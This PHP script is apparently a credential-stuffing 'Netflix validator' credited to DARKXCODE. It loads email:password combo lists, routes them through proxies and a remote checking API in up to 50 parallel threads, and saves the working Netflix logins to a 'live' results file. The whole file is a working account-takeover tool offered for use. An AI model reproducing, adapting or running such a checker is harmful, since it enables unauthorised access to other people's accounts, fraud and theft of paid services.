<?php

// DONT CHANGE THIS
/*==========> INFO 
 * CODE     : BY ZLAXTERT
 * SCRIPT   : VALIDATOR NETFLIX
 * VERSION  : V2
 * TELEGRAM : t.me/zlaxtert
 * BY       : DARKXCODE
 */


//========> REQUIRE

require_once "function/function.php";
require_once "function/gangbang.php";
require_once "function/threesome.php";
require_once "function/settings.php";

//========> BANNER

echo banner();
echo banner2();

//========> GET FILE

enterlist:
echo "$WH [$GR+$WH] Your file ($YL example.txt $WH) $GR>> $BL";
$listname = trim(fgets(STDIN));
if (empty($listname) || !file_exists($listname)) {
    echo PHP_EOL . PHP_EOL . "$WH [$YL!$WH] $RD FILE NOT FOUND$WH [$YL!$WH]$DEF" . PHP_EOL . PHP_EOL;
    goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));


//=========> THREADS

reqemail:
echo "$WH [$GR+$WH] Threads ($YL Max 50 $WH) ($YL Recomended 10 $WH) $GR>> $BL";
$reqemail = trim(fgets(STDIN));
$reqemail = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 0) ? 10 : $reqemail;
if ($reqemail > 50) {
    echo PHP_EOL . PHP_EOL . "$WH [$YL!$WH] $RD MAX 50$WH [$YL!$WH]$DEF" . PHP_EOL . PHP_EOL;
    goto reqemail;
}

//=========> COUNT

$live = 0;
$die = 0;
$unknown = 0;
$blckCook = 0;
$no = 0;
$total = count($lists);
echo "\n\n$WH [$YL!$WH] TOTAL $GR$total$WH LISTS [$YL!$WH]$DEF\n\n";

//========> LOOPING

$rollingCurl = new \RollingCurl\RollingCurl();

foreach ($lists as $list) {

    // GET SETTINGS
    if (strtolower($mode_proxy) == "off") {
        $Proxies = "";
        $proxy_pass = $proxy_pwd;
        $type_proxy = $typeProxy;
        $apikey = GetKey($thisKey);
        $APIs = GetKey($thisAPIs);
    } else {
        $Proxies = GetProxy($proxy_list);
        $proxy_pass = $proxy_pwd;
        $type_proxy = $typeProxy;
        $apikey = GetKey($thisKey);
        $APIs = GetKey($thisAPIs);
    }

    // EXPLODE
    $email = multiexplode(array(":", "|", "/", ";", ""), $list)[0];
    $pass = multiexplode(array(":", "|", "/", ";", ""), $list)[1];

    $email = str_replace("+", "", $email);
    //API
    $api = $APIs."/validator/netflix/?list=$email&proxy=$Proxies&proxyAuth=$proxy_pass&type_proxy=$type_proxy&apikey=$apikey";
    //CURL
    $rollingCurl->setOptions(array(CURLOPT_RETURNTRANSFER => 1, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_MAXREDIRS => 10, CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_TIMEOUT => 200))->get($api);

}

//==========> ROLLING CURL

$rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
    global $listname, $no, $total, $live, $die, $unknown, $blckCook;
    $no++;
    parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);
    $list = $params["list"];
    //RESPONSE
    $x = $request->getResponseText();
    $js = json_decode($x, TRUE);
    $msg = $js['data']['msg'];
    $type = $js['data']['type'];

    //============> COLLOR
    $BL = collorLine("BL");
    $RD = collorLine("RD");
    $GR = collorLine("GR");
    $YL = collorLine("YL");
    $MG = collorLine("MG");
    $DEF = collorLine("DEF");
    $CY = collorLine("CY");
    $WH = collorLine("WH");

    //============> RESPONSE


    if (strpos($x, '"status":"live"')) {
        $live++;
        save_file("result/live.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$GR LIVE$DEF =>$BL $list$DEF | [$YL TYPE$DEF: $WH$type$DEF ] [$YL MSG$DEF: $WH$msg$DEF ] | BY$CY DARKXCODE$DEF (V2)" . PHP_EOL;
    } else if (strpos($x, "INCORRECT")) {
        $die++;
        save_file("result/die.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$RD DIE$DEF =>$BL $list$DEF | [$YL TYPE$DEF: $WH$type$DEF ] [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (V2)" . PHP_EOL;
    } else if (strpos($x, '"msg":"BLOCK COOKIES!"}')) {
        $blckCook++;
        save_file("result/block-cookies.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$RD DIE$DEF =>$BL $list$DEF | [$YL TYPE$DEF: $WH$type$DEF ] [$YL MSG$DEF: $BL$msg$DEF ] | BY$CY DARKXCODE$DEF (V2)" . PHP_EOL;
    } else {
        $unknown++;
        save_file("result/unknown.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$YL UNKNOWN$DEF =>$BL $list$DEF | BY$CY DARKXCODE$DEF (V2)" . PHP_EOL;
    }
})->setSimultaneousLimit((int) $reqemail)->execute();

//============> END

echo PHP_EOL;
echo "================[DONE]================" . PHP_EOL;
echo " DATE          : " . $date . PHP_EOL;
echo " LIVE          : " . $live . PHP_EOL;
echo " DIE           : " . $die . PHP_EOL;
echo " BLOCK COOKIES : " . $blckCook . PHP_EOL;
echo " UNKNOWN       : " . $unknown . PHP_EOL;
echo " TOTAL         : " . $total . PHP_EOL;
echo "======================================" . PHP_EOL;
echo "[+] RATIO LIVE => $GR" . round(RatioCheck($live, $total)) . "%$DEF" . PHP_EOL . PHP_EOL;
echo "[!] NOTE : CHECK AGAIN FILE 'unknown.txt' or 'block-cookies.txt' [!]" . PHP_EOL;
echo "This file '" . $listname . "'" . PHP_EOL;
echo "File saved in folder 'result/' " . PHP_EOL . PHP_EOL;



?>